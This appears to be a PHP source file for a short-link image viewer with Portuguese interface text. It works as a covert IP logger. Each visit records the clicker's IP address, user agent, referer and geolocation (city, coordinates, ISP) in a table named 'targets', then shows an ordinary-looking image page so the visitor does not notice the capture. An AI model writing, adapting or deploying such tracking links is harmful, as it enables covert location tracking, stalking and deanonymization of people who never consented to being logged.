<?php
require_once 'config/config.php';
require_once 'config/database.php';
require_once 'includes/functions.php';

// Initialize database connection
$db = new Database();
$conn = $db->getConnection();

// Get the short code from URL
$short_code = $_GET['short_code'] ?? '';

if (empty($short_code)) {
    header('Location: index.php');
    exit;
}

// Find the link
$stmt = $conn->prepare("SELECT * FROM links WHERE short_code = ? AND (expiry_date IS NULL OR expiry_date > NOW())");
$stmt->execute([$short_code]);
$link = $stmt->fetch();

if (!$link) {
    header('Location: index.php?error=link_not_found');
    exit;
}

// Get client information
$ip_address = getClientIP();
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$referer = $_SERVER['HTTP_REFERER'] ?? '';
$timestamp = date('Y-m-d H:i:s');

// Get geolocation data
$geolocation_data = getGeolocationData($ip_address);

// Log the visit
$stmt = $conn->prepare("
    INSERT INTO targets (link_id, ip_address, user_agent, referer, country, region, city, latitude, longitude, timezone, isp, created_at) 
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
");

$stmt->execute([
    $link['id'],
    $ip_address,
    $user_agent,
    $referer,
    $geolocation_data['country'] ?? '',
    $geolocation_data['region'] ?? '',
    $geolocation_data['city'] ?? '',
    $geolocation_data['latitude'] ?? null,
    $geolocation_data['longitude'] ?? null,
    $geolocation_data['timezone'] ?? '',
    $geolocation_data['isp'] ?? '',
    $timestamp
]);

// Show the image instead of redirecting
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Visualizando Imagem</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #f8f9fa;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        
        .image-container {
            max-width: 90%;
            max-height: 90vh;
            text-align: center;
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            padding: 2rem;
        }
        
        .image-container img {
            max-width: 100%;
            max-height: 70vh;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        
        .loading {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 3rem;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #007bff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 1rem;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .error-message {
            color: #dc3545;
            font-size: 1.1rem;
            margin-top: 1rem;
        }
        
        .image-info {
            margin-top: 1rem;
            color: #6c757d;
            font-size: 0.9rem;
        }
        
        .back-button {
            position: fixed;
            top: 20px;
            left: 20px;
            background: rgba(0,0,0,0.7);
            color: white;
            border: none;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.9rem;
            transition: background 0.2s ease;
        }
        
        .back-button:hover {
            background: rgba(0,0,0,0.9);
        }
    </style>
</head>
<body>
    <button class="back-button" onclick="history.back()">
        ← Voltar
    </button>
    
    <div class="image-container">
        <div id="loading" class="loading">
            <div class="spinner"></div>
            <p>Carregando imagem...</p>
        </div>
        
        <div id="image-content" style="display: none;">
            <img id="main-image" src="" alt="Imagem" onerror="showError()">
            <div class="image-info">
                <p>Imagem carregada com sucesso</p>
            </div>
        </div>
        
        <div id="error-content" style="display: none;">
            <div class="error-message">
                <i class="fas fa-exclamation-triangle"></i>
                Erro ao carregar a imagem
            </div>
            <p style="margin-top: 1rem;">
                A imagem pode ter sido removida ou o link pode estar inválido.
            </p>
        </div>
    </div>

    <script>
        // Load the image
        const imageUrl = '<?php echo htmlspecialchars($link['original_url']); ?>';
        const img = document.getElementById('main-image');
        const loading = document.getElementById('loading');
        const imageContent = document.getElementById('image-content');
        const errorContent = document.getElementById('error-content');
        
        img.onload = function() {
            loading.style.display = 'none';
            imageContent.style.display = 'block';
        };
        
        img.onerror = function() {
            loading.style.display = 'none';
            errorContent.style.display = 'block';
        };
        
        function showError() {
            loading.style.display = 'none';
            errorContent.style.display = 'block';
        }
        
        // Set the image source
        img.src = imageUrl;
        
        // Auto-hide loading after 10 seconds
        setTimeout(function() {
            if (loading.style.display !== 'none') {
                showError();
            }
        }, 10000);
    </script>
</body>
</html>